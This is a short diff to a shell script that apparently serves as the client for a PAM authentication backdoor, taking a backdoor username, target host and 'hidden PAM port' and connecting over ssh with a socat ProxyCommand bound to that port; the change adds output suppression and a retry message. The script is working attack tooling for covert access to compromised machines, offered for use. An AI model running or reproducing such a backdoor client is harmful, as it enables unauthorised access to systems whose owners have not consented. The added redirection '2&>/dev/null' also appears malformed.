@@ -13,4 +13,4 @@ usage () { echo "$0 <PAM backdoor username> <host> <hidden PAM port>"; exit; }
 
 echo "Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1"
 read -p "Press enter to continue"
-ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1"
+ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1" 2&>/dev/null || echo "Failed to connect. bind probably still alive - wait a minute and try again."
